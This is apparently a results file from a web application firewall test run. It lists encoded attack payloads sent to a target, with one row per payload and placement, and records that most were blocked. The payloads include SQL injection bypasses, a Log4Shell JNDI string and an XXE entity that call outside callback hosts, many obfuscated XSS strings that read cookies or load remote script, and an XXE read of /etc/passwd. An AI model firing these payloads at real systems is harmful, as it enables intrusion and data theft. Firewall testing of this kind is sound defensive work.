Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F%2B,blocked,403,URLParam,URL,community,community-sqli,passed
-1945%2B%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F%2B1%2C2%2C3%2C%2527soy%2520vulnerable%2527%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2B--%2B,blocked,403,URLParam,URL,community,community-sqli,passed
%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F%2B,blocked,403,HTMLMultipartForm,URL,community,community-sqli,passed
${jndi:ldap://${hostName}.w63gecoroprj5um8ypnd7r6in9t0hseg3.oast.me/a},blocked,403,UserAgent,Plain,community,community-user-agent,passed
-1945%2B%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F%2B1%2C2%2C3%2C%2527soy%2520vulnerable%2527%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2B--%2B,blocked,403,HTMLForm,URL,community,community-sqli,passed
-1945%2B%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F%2B1%2C2%2C3%2C%2527soy%2520vulnerable%2527%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2B--%2B,blocked,403,JSONRequest,URL,community,community-sqli,passed
-1945%2B%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F%2B1%2C2%2C3%2C%2527soy%2520vulnerable%2527%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2B--%2B,blocked,403,HTMLMultipartForm,URL,community,community-sqli,passed
"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/6.17.0.RELEASE iPhone12,8 iOS/14.5.1))",blocked,403,UserAgent,Plain,community,community-user-agent,passed
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r6in9t0hseg3.interact.sh",blocked,403,UserAgent,Plain,community,community-user-agent,passed
"Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4.1)",blocked,403,UserAgent,Plain,community,community-user-agent,passed
Fuzz Faster U Fool v2.0.0,blocked,403,UserAgent,Plain,community,community-user-agent,passed
Microsoft WinRM Client OpenVASVT,blocked,403,UserAgent,Plain,community,community-user-agent,passed
Nuclei - Open-source project (github.com/projectdiscovery/nuclei),blocked,403,UserAgent,Plain,community,community-user-agent,passed
sqlmap/1.7.4#stable (https://sqlmap.org),blocked,403,UserAgent,Plain,community,community-user-agent,passed
javascript%3A%25ef%25bb%25bfalert%28XSS%29,blocked,403,URLParam,URL,community,community-xss,passed
javascript%3A%25ef%25bb%25bfalert%28XSS%29,blocked,403,HTMLForm,URL,community,community-xss,passed
javascript%3A%25ef%25bb%25bfalert%28XSS%29,blocked,403,JSONRequest,URL,community,community-xss,passed
javascript%3A%25ef%25bb%25bfalert%28XSS%29,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F,blocked,403,URLParam,URL,community,community-xss,passed
%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F,blocked,403,HTMLForm,URL,community,community-xss,passed
%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F,blocked,403,JSONRequest,URL,community,community-xss,passed
alert%3F.%28document%3F.cookie%29,blocked,403,URLParam,URL,community,community-xss,passed
alert%3F.%28document%3F.cookie%29,blocked,403,HTMLForm,URL,community,community-xss,passed
alert%3F.%28document%3F.cookie%29,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cobject%2Fdata%3Djavascript%3Aalert%28%29%3E,blocked,403,URLParam,URL,community,community-xss,passed
alert%3F.%28document%3F.cookie%29,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Cobject%2Fdata%3Djavascript%3Aalert%28%29%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Ca+href%3Djavas%2526%2399%3Bript%3Aprompt%2526%23x28document.domain%29%3Exss,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Ca+href%3Djavas%2526%2399%3Bript%3Aprompt%2526%23x28document.domain%29%3Exss,blocked,403,URLParam,URL,community,community-xss,passed
%3Cobject%2Fdata%3Djavascript%3Aalert%28%29%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Ca+href%3Djavas%2526%2399%3Bript%3Aprompt%2526%23x28document.domain%29%3Exss,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cobject%2Fdata%3Djavascript%3Aalert%28%29%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%22%3E%3Cvideo%3E%3Csource+onerror%3Deval%28atob%28http%3A%2F%2Fsome_host%29%29+id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%26%2361%3B%26%2361%3B%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Ca+href%3Djavas%2526%2399%3Bript%3Aprompt%2526%23x28document.domain%29%3Exss,blocked,403,JSONRequest,URL,community,community-xss,passed
%22%3E%3Cvideo%3E%3Csource+onerror%3Deval%28atob%28http%3A%2F%2Fsome_host%29%29+id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%26%2361%3B%26%2361%3B%3E,blocked,403,URLParam,URL,community,community-xss,passed
%22%3E%3Cvideo%3E%3Csource+onerror%3Deval%28atob%28http%3A%2F%2Fsome_host%29%29+id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%26%2361%3B%26%2361%3B%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%22%3E%3Cvideo%3E%3Csource+onerror%3Deval%28atob%28http%3A%2F%2Fsome_host%29%29+id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%26%2361%3B%26%2361%3B%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3CxssBypass%2Fonpointermove%3D%28confirm%29%281%29%3EMoveMouseHere,blocked,403,URLParam,URL,community,community-xss,passed
%3CxssBypass%2Fonpointermove%3D%28confirm%29%281%29%3EMoveMouseHere,blocked,403,HTMLForm,URL,community,community-xss,passed
%3CxssBypass%2Fonpointermove%3D%28confirm%29%281%29%3EMoveMouseHere,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3CxssBypass%2Fonpointermove%3D%28confirm%29%281%29%3EMoveMouseHere,blocked,403,JSONRequest,URL,community,community-xss,passed
Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B%2Fxss-by-tarun%2F%26rpar%3B%22%3EXXXXX%3C%2Fa%3E,blocked,403,URLParam,URL,community,community-xss,passed
Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B%2Fxss-by-tarun%2F%26rpar%3B%22%3EXXXXX%3C%2Fa%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B%2Fxss-by-tarun%2F%26rpar%3B%22%3EXXXXX%3C%2Fa%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cvideo+src%3Dx+onerror%3D%22prompt%28xss%22%3E,blocked,403,URLParam,URL,community,community-xss,passed
Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B%2Fxss-by-tarun%2F%26rpar%3B%22%3EXXXXX%3C%2Fa%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cvideo+src%3Dx+onerror%3D%22prompt%28xss%22%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cvideo+src%3Dx+onerror%3D%22prompt%28xss%22%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cvideo+src%3Dx+onerror%3D%22prompt%28xss%22%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Ciframe+src%3D%22java+sc+ript%3Aal+ert%28%29%22%3E%3C%2Fiframe%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Ciframe+src%3D%22java+sc+ript%3Aal+ert%28%29%22%3E%3C%2Fiframe%3E,blocked,403,URLParam,URL,community,community-xss,passed
%3Ciframe+src%3D%22java+sc+ript%3Aal+ert%28%29%22%3E%3C%2Fiframe%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Ciframe+src%3D%22java+sc+ript%3Aal+ert%28%29%22%3E%3C%2Fiframe%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%253Cx%2FOnpointerrawupdate%3Dconfirm%2526lpar%3B%29%253Exxxxx,blocked,403,URLParam,URL,community,community-xss,passed
%253Cx%2FOnpointerrawupdate%3Dconfirm%2526lpar%3B%29%253Exxxxx,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%253Cx%2FOnpointerrawupdate%3Dconfirm%2526lpar%3B%29%253Exxxxx,blocked,403,JSONRequest,URL,community,community-xss,passed
%253Cx%2FOnpointerrawupdate%3Dconfirm%2526lpar%3B%29%253Exxxxx,blocked,403,HTMLForm,URL,community,community-xss,passed
eval%28atob%28%27YWxlcnQoKQ%3D%3D%27%29%29,blocked,403,URLParam,URL,community,community-xss,passed
eval%28atob%28%27YWxlcnQoKQ%3D%3D%27%29%29,blocked,403,HTMLForm,URL,community,community-xss,passed
eval%28atob%28%27YWxlcnQoKQ%3D%3D%27%29%29,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
eval%28atob%28%27YWxlcnQoKQ%3D%3D%27%29%29,blocked,403,JSONRequest,URL,community,community-xss,passed
document%5B%27cookie%27%5D,blocked,403,URLParam,URL,community,community-xss,passed
document%5B%27cookie%27%5D,blocked,403,HTMLForm,URL,community,community-xss,passed
document%5B%27cookie%27%5D,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Cimg+src+onerror%3Dconfirm%281%29%3E,blocked,403,URLParam,URL,community,community-xss,passed
document%5B%27cookie%27%5D,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cimg+src+onerror%3Dconfirm%281%29%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cimg+src+onerror%3Dconfirm%281%29%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%26gt%3B%2Bsrc%2Bonerror%3Dconfirm%26amp%3Blpar%3B1%26amp%3Brpar%3B%26lt%3B,blocked,403,URLParam,URL,community,community-xss,passed
%3Cimg+src+onerror%3Dconfirm%281%29%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%26gt%3B%2Bsrc%2Bonerror%3Dconfirm%26amp%3Blpar%3B1%26amp%3Brpar%3B%26lt%3B,blocked,403,HTMLForm,URL,community,community-xss,passed
%26gt%3B%2Bsrc%2Bonerror%3Dconfirm%26amp%3Blpar%3B1%26amp%3Brpar%3B%26lt%3B,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%26gt%3B%2Bsrc%2Bonerror%3Dconfirm%26amp%3Blpar%3B1%26amp%3Brpar%3B%26lt%3B,blocked,403,JSONRequest,URL,community,community-xss,passed
%22%3E%3C%2Ftextarea%3E%3CScRiPt%3Eprompt%281%29%3C%2FScRiPt%2F%2F+%22%3E%3Ciframe%2Fonload%3Dalert%281%29%2F%2F+%E2%80%9D%2F%3E%26_lt%3B_script%3Ealert%281%29%26_lt%3B%2Fscr_ipt%26gt%E2%80%9D%2F%3E,blocked,403,URLParam,URL,community,community-xss,passed
%22%3E%3C%2Ftextarea%3E%3CScRiPt%3Eprompt%281%29%3C%2FScRiPt%2F%2F+%22%3E%3Ciframe%2Fonload%3Dalert%281%29%2F%2F+%E2%80%9D%2F%3E%26_lt%3B_script%3Ealert%281%29%26_lt%3B%2Fscr_ipt%26gt%E2%80%9D%2F%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%7B%60+%3Cbody+%5C%3C+onscroll+%3D1%28_%3Dprompt%2C_%28String.fromCharCode%2888%2C83%2C83%2C32%2C66%2C121%2C32%2C77%2C111%2C114%2C112%2C104%2C105%2C110%2C101%29%29%29%3E%C2%B4%7D,blocked,403,URLParam,URL,community,community-xss,passed
%22%3E%3C%2Ftextarea%3E%3CScRiPt%3Eprompt%281%29%3C%2FScRiPt%2F%2F+%22%3E%3Ciframe%2Fonload%3Dalert%281%29%2F%2F+%E2%80%9D%2F%3E%26_lt%3B_script%3Ealert%281%29%26_lt%3B%2Fscr_ipt%26gt%E2%80%9D%2F%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%22%3E%3C%2Ftextarea%3E%3CScRiPt%3Eprompt%281%29%3C%2FScRiPt%2F%2F+%22%3E%3Ciframe%2Fonload%3Dalert%281%29%2F%2F+%E2%80%9D%2F%3E%26_lt%3B_script%3Ealert%281%29%26_lt%3B%2Fscr_ipt%26gt%E2%80%9D%2F%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%7B%60+%3Cbody+%5C%3C+onscroll+%3D1%28_%3Dprompt%2C_%28String.fromCharCode%2888%2C83%2C83%2C32%2C66%2C121%2C32%2C77%2C111%2C114%2C112%2C104%2C105%2C110%2C101%29%29%29%3E%C2%B4%7D,blocked,403,HTMLForm,URL,community,community-xss,passed
%7B%60+%3Cbody+%5C%3C+onscroll+%3D1%28_%3Dprompt%2C_%28String.fromCharCode%2888%2C83%2C83%2C32%2C66%2C121%2C32%2C77%2C111%2C114%2C112%2C104%2C105%2C110%2C101%29%29%29%3E%C2%B4%7D,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Csvg%250Aonauxclick%3D0%3B%5B1%5D.some%28confirm%29%2F%2F,blocked,403,URLParam,URL,community,community-xss,passed
%3Csvg%250Aonauxclick%3D0%3B%5B1%5D.some%28confirm%29%2F%2F,blocked,403,HTMLForm,URL,community,community-xss,passed
%7B%60+%3Cbody+%5C%3C+onscroll+%3D1%28_%3Dprompt%2C_%28String.fromCharCode%2888%2C83%2C83%2C32%2C66%2C121%2C32%2C77%2C111%2C114%2C112%2C104%2C105%2C110%2C101%29%29%29%3E%C2%B4%7D,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Csvg%250Aonauxclick%3D0%3B%5B1%5D.some%28confirm%29%2F%2F,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Csvg%250Aonauxclick%3D0%3B%5B1%5D.some%28confirm%29%2F%2F,blocked,403,JSONRequest,URL,community,community-xss,passed
%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%29,blocked,403,URLParam,URL,community,community-xss,passed
%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%29,blocked,403,HTMLForm,URL,community,community-xss,passed
%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%29,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%29,blocked,403,JSONRequest,URL,community,community-xss,passed
%2522onauxclick%3Dalert%60xss%60%2Ba,blocked,403,HTMLForm,URL,community,community-xss,passed
%2522onauxclick%3Dalert%60xss%60%2Ba,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%2522onauxclick%3Dalert%60xss%60%2Ba,blocked,403,JSONRequest,URL,community,community-xss,passed
%2522onauxclick%3Dalert%60xss%60%2Ba,blocked,403,URLParam,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22javas%26Tab%3Bcript%3Aal%22%2B%22ert%60%60%22%27%3B%3E,blocked,403,URLParam,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22javas%26Tab%3Bcript%3Aal%22%2B%22ert%60%60%22%27%3B%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22jav%22%2B%22as%26Tab%3Bcr%22%2B%22ipt%3Aal%22%2B%22er%22%2B%22t%28%29%22%27%3B%3E,blocked,403,URLParam,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22javas%26Tab%3Bcript%3Aal%22%2B%22ert%60%60%22%27%3B%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22javas%26Tab%3Bcript%3Aal%22%2B%22ert%60%60%22%27%3B%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22jav%22%2B%22as%26Tab%3Bcr%22%2B%22ipt%3Aal%22%2B%22er%22%2B%22t%28%29%22%27%3B%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22jav%22%2B%22as%26Tab%3Bcr%22%2B%22ipt%3Aal%22%2B%22er%22%2B%22t%28%29%22%27%3B%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,URLParam,URL,community,community-xss,passed
%3Ciframe%2Fonload%3D%27this%5B%22src%22%5D%3D%22jav%22%2B%22as%26Tab%3Bcr%22%2B%22ipt%3Aal%22%2B%22er%22%2B%22t%28%29%22%27%3B%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,JSONRequest,URL,community,community-xss,passed
data%3Atext%2Fhtml%2C%3Cform+action%3Dhttps%3A%2F%2F127.0.0.1%2Fxss-cp.php+method%3Dpost%3E%3Cinput+type%3Dhidden+name%3Da+value%3D%22%3Cimg%2Fsrc%3D%2F%2F127.0.0.1%2Fyt.jpg+onpointerenter%3Dalert%601%60%3E%22%3E%3Cinput+type%3Dsubmit%3E%3C%2Fform%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
data%3Atext%2Fhtml%2C%3Cform+action%3Dhttps%3A%2F%2F127.0.0.1%2Fxss-cp.php+method%3Dpost%3E%3Cinput+type%3Dhidden+name%3Da+value%3D%22%3Cimg%2Fsrc%3D%2F%2F127.0.0.1%2Fyt.jpg+onpointerenter%3Dalert%601%60%3E%22%3E%3Cinput+type%3Dsubmit%3E%3C%2Fform%3E,blocked,403,URLParam,URL,community,community-xss,passed
data%3Atext%2Fhtml%2C%3Cform+action%3Dhttps%3A%2F%2F127.0.0.1%2Fxss-cp.php+method%3Dpost%3E%3Cinput+type%3Dhidden+name%3Da+value%3D%22%3Cimg%2Fsrc%3D%2F%2F127.0.0.1%2Fyt.jpg+onpointerenter%3Dalert%601%60%3E%22%3E%3Cinput+type%3Dsubmit%3E%3C%2Fform%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
data%3Atext%2Fhtml%2C%3Cform+action%3Dhttps%3A%2F%2F127.0.0.1%2Fxss-cp.php+method%3Dpost%3E%3Cinput+type%3Dhidden+name%3Da+value%3D%22%3Cimg%2Fsrc%3D%2F%2F127.0.0.1%2Fyt.jpg+onpointerenter%3Dalert%601%60%3E%22%3E%3Cinput+type%3Dsubmit%3E%3C%2Fform%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,URLParam,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,HTMLForm,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3Cj+id%3Dx+style%3D%22-webkit-user-modify%3Aread-write%22+onfocus%3D%7Bwindow.onerror%3Deval%7Dthrow%2F0%2F%2Bname%3EH%3C%2Fj%3E%23x,blocked,403,JSONRequest,URL,community,community-xss,passed
%3C%21%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,blocked,403,URLParam,URL,community,community-xss,passed
%3C%21%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,blocked,403,HTMLForm,URL,community,community-xss,passed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/etc/passwd"">]><foo>&data;</foo>",blocked,403,XMLBody,Plain,community,community-xxe,passed
%3C%21%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,blocked,403,HTMLMultipartForm,URL,community,community-xss,passed
%3C%21%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
union+was+a+great+select,blocked,403,URLParam,URL,false-pos,texts,failed
"<?xml version=""1.0"" encoding=""UTF-7""?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
",blocked,403,XMLBody,Plain,community,community-xxe,passed
union+was+a+great+select,blocked,403,HTMLForm,URL,false-pos,texts,failed
union+was+a+great+select,blocked,403,HTMLMultipartForm,URL,false-pos,texts,failed
D%27or+1st+parfume,blocked,403,URLParam,URL,false-pos,texts,failed
1%29+a-b%3Dc,blocked,403,URLParam,URL,false-pos,texts,failed
DEAR+FINN%2C--I+think+it+would+do%3B+copy+should+reach+us+second+post,blocked,403,URLParam,URL,false-pos,texts,failed
The+Senora+found+herself+a+heroine%3B+more+than+that%2C+she+became+aware,blocked,403,URLParam,URL,false-pos,texts,failed
time+he+came.,blocked,403,URLParam,URL,false-pos,texts,failed
echo+in+the+mirror,blocked,403,URLParam,URL,false-pos,texts,failed
curl+and+divergence,blocked,403,URLParam,URL,false-pos,texts,failed
exec+noun,blocked,403,URLParam,URL,false-pos,texts,failed
bash+away+in+the+gym,blocked,403,URLParam,URL,false-pos,texts,failed
zsh+is+the+best%21,blocked,403,URLParam,URL,false-pos,texts,failed
java+lang+courses,blocked,403,URLParam,URL,false-pos,texts,failed
zsh+is+the+best%21,blocked,403,HTMLMultipartForm,URL,false-pos,texts,failed
zsh+is+the+best%21,blocked,403,HTMLForm,URL,false-pos,texts,failed
JavaScript%3A+Basics+of+JavaScript+Language,blocked,403,HTMLMultipartForm,URL,false-pos,texts,failed
JavaScript%3A+Basics+of+JavaScript+Language,blocked,403,HTMLForm,URL,false-pos,texts,failed
